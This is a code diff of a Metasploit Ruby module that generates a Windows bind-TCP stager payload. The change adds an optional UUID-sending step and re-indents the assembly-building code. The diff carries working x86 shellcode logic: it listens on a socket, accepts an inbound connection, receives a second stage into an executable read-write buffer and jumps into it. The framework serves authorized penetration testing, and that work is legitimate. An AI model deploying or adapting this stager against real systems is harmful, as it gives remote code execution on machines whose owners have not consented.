@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
+require 'msf/core/payload/windows/send_uuid'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -19,6 +20,7 @@ module Payload::Windows::BindTcp
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::SendUUID
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 
@@ -38,6 +40,14 @@ module Payload::Windows::BindTcp
     end
 
     generate_bind_tcp(conf)
+  end
+
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
   end
 
   def transport_config(opts={})
@@ -136,17 +146,17 @@ module Payload::Windows::BindTcp
         push edi               ; socket
         push 0x6737DBC2        ; hash( "ws2_32.dll", "bind" )
         call ebp               ; bind( s, &sockaddr_in, 16 );
-      ^
+    ^
 
-      # Check for a failed bind() call
-      if reliable
-        asm << %Q^
-            test eax,eax
-            jnz failure
-          ^
-      end
-
+    # Check for a failed bind() call
+    if reliable
       asm << %Q^
+        test eax,eax
+        jnz failure
+      ^
+    end
+
+    asm << %Q^
                                ; backlog, pushed earlier [3]
         push edi               ; socket
         push 0xFF38E9B7        ; hash( "ws2_32.dll", "listen" )
@@ -162,7 +172,11 @@ module Payload::Windows::BindTcp
         xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
         push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
         call ebp               ; closesocket( s );
+    ^
 
+    asm << asm_send_uuid if include_send_uuid
+
+    asm << %Q^
       recv:
         ; Receive the size of the incoming second stage...
         push 0                 ; flags
@@ -171,17 +185,17 @@ module Payload::Windows::BindTcp
         push edi               ; the saved socket
         push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
         call ebp               ; recv( s, &dwLength, 4, 0 );
-      ^
+    ^
 
-      # Check for a failed recv() call
-      if reliable
-        asm << %Q^
-            cmp eax, 0
-            jle failure
-          ^
-      end
-
+    # Check for a failed recv() call
+    if reliable
       asm << %Q^
+        cmp eax, 0
+        jle failure
+      ^
+    end
+
+    asm << %Q^
         ; Alloc a RWX buffer for the second stage
         mov esi, [esi]         ; dereference the pointer to the second stage length
         push 0x40              ; PAGE_EXECUTE_READWRITE
@@ -200,38 +214,37 @@ module Payload::Windows::BindTcp
         push edi               ; the saved socket
         push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
         call ebp               ; recv( s, buffer, length, 0 );
-      ^
+    ^
 
-      # Check for a failed recv() call
-      if reliable
-        asm << %Q^
-            cmp eax, 0
-            jle failure
-          ^
-      end
-
+    # Check for a failed recv() call
+    if reliable
       asm << %Q^
+        cmp eax, 0
+        jle failure
+      ^
+    end
+
+    asm << %Q^
         add ebx, eax           ; buffer += bytes_received
         sub esi, eax           ; length -= bytes_received, will set flags
         jnz read_more          ; continue if we have more to read
         ret                    ; return into the second stage
+    ^
+
+    if reliable
+      if opts[:exitfunk]
+        asm << %Q^
+      failure:
         ^
-
-      if reliable
-        if opts[:exitfunk]
-          asm << %Q^
-            failure:
-
-            ^
-          asm << asm_exitfunk(opts)
-        else
-          asm << %Q^
-            failure:
-              push 0x56A2B5F0        ; hardcoded to exitprocess for size
-              call ebp
-            ^
-        end
+        asm << asm_exitfunk(opts)
+      else
+        asm << %Q^
+      failure:
+        push 0x56A2B5F0        ; hardcoded to exitprocess for size
+        call ebp
+        ^
       end
+    end
 
     asm
   end
